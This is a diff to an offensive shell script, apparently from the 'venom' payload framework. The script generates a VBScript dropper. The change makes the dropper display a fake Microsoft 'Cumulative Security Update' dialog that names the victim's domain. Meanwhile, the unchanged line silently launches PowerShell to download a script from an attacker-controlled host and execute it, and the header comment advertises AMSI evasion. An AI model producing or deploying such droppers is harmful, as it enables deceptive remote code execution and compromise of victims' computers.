@@ -12073,8 +12073,10 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
 else
    ## Silent Execution -> OBFUSCATION=ON (none terminal pops up)
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
+   echo "Dim str,x" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
-   echo "MsgBox(\"Cumulative Security Update KB4524147\" & vbCrLf & \"Microsoft Corporation. All Rights Reserved\")" >> $IPATH/output/$Drop.vbs
+   echo "str = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
+   echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & str & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
    echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
 fi
 
